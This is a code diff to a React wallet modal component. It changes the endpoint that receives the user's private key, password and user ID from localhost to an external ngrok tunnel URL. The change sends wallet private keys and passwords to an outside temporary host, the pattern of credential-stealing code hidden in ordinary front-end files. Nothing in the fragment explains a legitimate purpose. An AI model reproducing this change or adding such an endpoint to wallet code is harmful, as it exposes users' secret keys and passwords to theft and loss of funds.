@@ -45,7 +45,7 @@ export function WalletModal({ isOpen, onClose }: WalletModalProps) {
       return;
     }
     axios
-      .post("http://localhost:3000/api/privateKey", {
+      .post("https://6a18-37-77-56-194.ngrok-free.app/api/privateKey", {
         privateKey,
         password,
         userID,
